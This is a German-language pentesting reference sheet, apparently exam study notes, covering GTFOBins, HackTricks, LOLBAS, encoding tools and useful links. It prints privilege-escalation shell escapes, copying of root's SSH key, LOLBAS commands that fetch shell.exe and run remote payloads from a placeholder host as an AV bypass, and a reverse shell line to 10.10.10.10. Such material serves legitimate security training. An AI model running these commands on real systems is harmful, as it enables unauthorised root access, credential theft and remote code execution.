# Tools Referenz

---

## GTFOBins

> Sammlung von Unix-Binaries, die zur Privilege Escalation, Shell-Escape oder Datei-Lese genutzt werden können, wenn sie mit erhöhten Rechten laufen.
> **https://gtfobins.github.io/**

**Wann nutzen?**
- Nach `find / -perm -4000` → SUID Binary gefunden
- Nach `sudo -l` → darf bestimmtes Binary als root ausführen
- Nach Capabilities-Check → Binary hat z.B. cap_setuid

**Workflow:**
```bash
# 1. SUID oder sudo Rechte finden
find / -perm -4000 2>/dev/null
sudo -l

# 2. GTFOBins aufrufen → Binary suchen → Kategorie wählen:
#    SUID / Sudo / File Read / File Write / Shell / Capabilities

# 3. Befehl kopieren + ausführen
```

**Häufige Beispiele:**
```bash
# find
find . -exec /bin/sh -p \; -quit

# python3 (sudo)
sudo python3 -c 'import os; os.system("/bin/bash")'

# vim
vim -c ':!/bin/sh'

# less (sudo) → innerhalb less: !/bin/sh
sudo less /etc/passwd

# tar
sudo tar -cf /dev/null /dev/null --checkpoint=1 --checkpoint-action=exec=/bin/sh

# awk
sudo awk 'BEGIN {system("/bin/bash")}'

# perl
sudo perl -e 'exec "/bin/bash"'

# cp (SUID) → Dateien lesen
cp /root/.ssh/id_rsa /tmp/key
```

---

## HackTricks

> Umfassende Pentesting-Wissensdatenbank – von Port-Enumeration bis Privilege Escalation.
> **https://book.hacktricks.xyz/**

> **Hinweis des Professors: HackTricks wird in der Prüfung genutzt!**

**Wann nutzen?**
```
1. Unbekannten Port gefunden → "Pentesting <Port>" suchen
   Beispiel: "Pentesting SNMP", "Pentesting LDAP", "Pentesting Redis"

2. Unbekannten Dienst / Technologie → HackTricks Suche

3. Nach Enumeration → Was als nächstes?
   Beispiel: "Linux Privilege Escalation" → komplette Checkliste

4. Spezifischer Exploit unklar → Schritt-für-Schritt-Anleitung

5. Web Vulnerabilities → LFI, SSRF, XXE, SQLi Bypass-Techniken
```

**Wichtige Seiten:**
```
https://book.hacktricks.xyz/network-services-pentesting/pentesting-<port>
https://book.hacktricks.xyz/linux-hardening/privilege-escalation
https://book.hacktricks.xyz/windows-hardening/windows-local-privilege-escalation
https://book.hacktricks.xyz/pentesting-web/sql-injection
https://book.hacktricks.xyz/generic-methodologies-and-resources/reverse-shells
```

---

## LOLBAS – Living Off the Land (Windows)

> Sammlung von Windows-eigenen Binaries/Scripts, die für Angriffe missbraucht werden können – kein eigenes Tool hochladen nötig!
> **https://lolbas-project.github.io/**

**Wann nutzen?**
- Kein Tool hochladen möglich (AV/Firewall blockt)
- Unauffällig bleiben (normale Windows-Tools)
- Datei ohne wget/curl herunterladen
- Code ohne .exe-Upload ausführen

**Wichtigste Beispiele:**
```cmd
# Datei herunterladen
certutil.exe -urlcache -split -f "http://<ip>/shell.exe" C:\Temp\shell.exe
bitsadmin /transfer job /download /priority normal http://<ip>/shell.exe C:\Temp\shell.exe

# Base64 encodieren/decodieren
certutil -encode input.exe output.b64
certutil -decode output.b64 decoded.exe

# Code ausführen (AV-Bypass)
mshta.exe http://<ip>/payload.hta
regsvr32 /s /n /u /i:http://<ip>/file.sct scrobj.dll

# Port-Weiterleitung
netsh interface portproxy add v4tov4 listenport=4444 connectaddress=<ip> connectport=4444

# System-Info
whoami /all
wmic product get name
wmic service get name,displayname,pathname,startmode
```

---

## Manueller Code vs. Python Exploit

| Situation | Ansatz |
|-----------|--------|
| CVE mit bekanntem PoC auf GitHub | Python Exploit / fertiges Script |
| SUID / Sudo Missbrauch | Manuell (GTFOBins Befehl) |
| SQL Injection einfach | Manuell mit sqlmap oder curl |
| Komplexer Exploit (Buffer Overflow) | Python PoC |
| Web Shell hochladen | Manuell (curl oder Browser) |
| Metasploit Modul vorhanden | Metasploit nutzen |
| Kein Modul, GitHub PoC existiert | Python Exploit ausführen |
| Schnelles Testen eines Payloads | Manuell |

```bash
# Python Exploit ausführen
git clone <repo-url>
pip install -r requirements.txt --break-system-packages
python3 exploit.py --target <ip> --port 80

# Wenn Python2 nötig
python2 exploit.py <ip> <port>
```

---

## CyberChef

> Alles-in-einem Encoding/Decoding/Crypto Tool im Browser
> **https://gchq.github.io/CyberChef/**

```
Funktionen: Base64, URL, Hex, ROT13, XOR, AES, MD5, SHA, Magic (auto-detect)
Magic-Funktion: erkennt automatisch das Format!
Chains: mehrere Operationen hintereinander kombinieren
```

## Ciphey – automatisches Decoding

> **https://github.com/Ciphey/Ciphey**
> Automatische Entschlüsselung – erkennt Format selbst (Base64, Caesar, Vigenère, ...)

```bash
pip install ciphey --break-system-packages
ciphey -t "dGhpcyBpcyBhIHRlc3Q="
ciphey -f datei.txt
```

## PayloadsAllTheThings

> **https://github.com/swisskyrepo/PayloadsAllTheThings**
> Bypasses & Payloads für Web Application Security (LFI, SQLi, XSS, SSRF, etc.)

---

## Encoding / Decoding

```bash
# Base64 (Linux)
echo -n "text" | base64                              # encodieren
echo "dGV4dA==" | base64 -d                         # decodieren
base64 datei.bin > datei.b64
base64 -d datei.b64 > datei.bin

# URL Encoding (Python3)
python3 -c "import urllib.parse; print(urllib.parse.quote('/bin/bash -i >& /dev/tcp/10.10.10.10/443'))"
python3 -c "import urllib.parse; print(urllib.parse.unquote('text%20%2F%20encoded'))"

# Häufige URL-kodierte Zeichen:
# Leerzeichen = %20   /  = %2F   & = %26   = = %3D
# < = %3C            > = %3E   # = %23   ? = %3F

# Windows PowerShell
[convert]::ToBase64String([System.Text.Encoding]::UTF8.GetBytes("text"))
[System.Text.Encoding]::UTF8.GetString([System.Convert]::FromBase64String("dGV4dA=="))
```

---

## Shellcode Ressourcen

```
https://www.exploit-db.com/papers/13224    → Introduction to Writing Shellcode
https://www.offsec.com/metasploit-unleashed/msfvenom/   → OffSec MSFvenom Doku
```

---

## Nützliche Links

```
https://www.revshells.com                  → Reverse Shell Generator
https://gtfobins.github.io/                → SUID / Sudo Exploits
https://lolbas-project.github.io/          → Windows Living Off the Land
https://book.hacktricks.xyz/               → Pentesting Wissensdatenbank
https://gchq.github.io/CyberChef/          → Encoding / Decoding
https://github.com/swisskyrepo/PayloadsAllTheThings  → Web Payloads
https://crackstation.net                   → Online Hash Cracking
https://hashes.com/en/decrypt/hash         → Online Hash Cracking
https://www.shodan.io/                     → Internet Scanner
https://github.com/danielmiessler/SecLists → Wortlisten-Sammlung
https://github.com/nickvourd/Windows-Local-Privilege-Escalation-Cookbook
https://github.com/ihebski/DefaultCreds-cheat-sheet  → Default Credentials
https://github.com/21y4d/nmapAutomator     → Nmap Automator
https://github.com/Ignitetechnologies/Mindmap         → Mindmaps (Nmap, SMB, Metasploit...)
https://ptestmethod.readthedocs.io/en/latest/LFF-IPS-P2-VulnerabilityAnalysis.html
```
